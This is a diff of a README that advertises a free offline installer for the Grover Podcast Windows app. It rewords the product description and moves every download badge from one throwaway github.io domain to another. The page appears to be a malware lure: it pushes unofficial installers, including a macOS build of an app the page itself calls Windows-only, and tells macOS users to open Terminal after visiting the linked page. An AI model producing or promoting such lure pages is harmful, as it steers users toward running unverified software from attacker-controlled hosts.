@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Podcast+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Grover Podcast Free Installer** — Grover Podcast is a modern podcast application for Windows 10 and Windows 11 with a Fluent Design interface that fits naturally into the modern Windows aesthetic. Works without internet access, no account required. Full offline installation.
+**💻 Grover Podcast Free Installer** — Grover Podcast is a Windows podcast app with a modern, clean interface for subscribing, downloading, and listening to podcasts. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Grover Podcast](https://img.shields.io/badge/⬇_Install_Grover+Podcast-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Grover Podcast](https://img.shields.io/badge/⬇_Install_Grover+Podcast-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Grover Podcast
 
-Grover Podcast is a modern podcast application for Windows 10 and Windows 11 with a Fluent Design interface that fits naturally into the modern Windows aesthetic. Subscribe to podcasts, manage downloads, control playback speed, and organize your podcast library. Grover Podcast delivers a polished podcast listening experience that feels at home on Windows compared to cross-platform alternatives.
+Grover Podcast is a Windows podcast app with a modern, clean interface for subscribing, downloading, and listening to podcasts. It provides a visually appealing alternative to default Windows media apps for podcast consumption.
 
 ---
 
 ## ❌ Problem: Grover Podcast is hard to access
 
-- **Windows Only** — Designed exclusively for modern Windows
-- **Store Distribution** — Available through Microsoft Store
-- **Feature Depth** — Some advanced podcast management features less developed than major apps
-- **Sync** — Cross-device sync less seamless than mobile-native podcast apps
+- **Windows Only** — Not available on macOS or Linux
+- **Microsoft Store App** — Distributed through Microsoft Store; sandboxing may limit some features
+- **Development Activity** — Update frequency has slowed in recent versions
+- **Basic Features** — Missing advanced episode management features of cross-platform podcast apps
 
 ---
 
@@ -61,9 +61,9 @@ Grover Podcast is a modern podcast application for Windows 10 and Windows 11 wit
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Grover Podcast is a modern podcast application for Windows 10 and Windows 11 wit
 
 <div align="center">
 
-[![⬇ Install Grover Podcast](https://img.shields.io/badge/⬇_Install_Grover+Podcast-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Grover Podcast](https://img.shields.io/badge/⬇_Install_Grover+Podcast-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Grover Podcast is a modern podcast application for Windows 10 and Windows 11 wit
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Grover Podcast is a modern podcast application for Windows 10 and Windows 11 wit
 
 ---
 
-**Grover Podcast Free Installer** — Grover Podcast is a modern podcast application for Windows 10 and Windows 11 with a Fluent Design interface that fits naturally into the modern Windows aesthetic. Install without internet connection today!
+**Grover Podcast Free Installer** — Grover Podcast is a Windows podcast app with a modern, clean interface for subscribing, downloading, and listening to podcasts. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Grover Podcast](https://img.shields.io/badge/⬇_Install_Grover+Podcast-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Grover Podcast](https://img.shields.io/badge/⬇_Install_Grover+Podcast-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
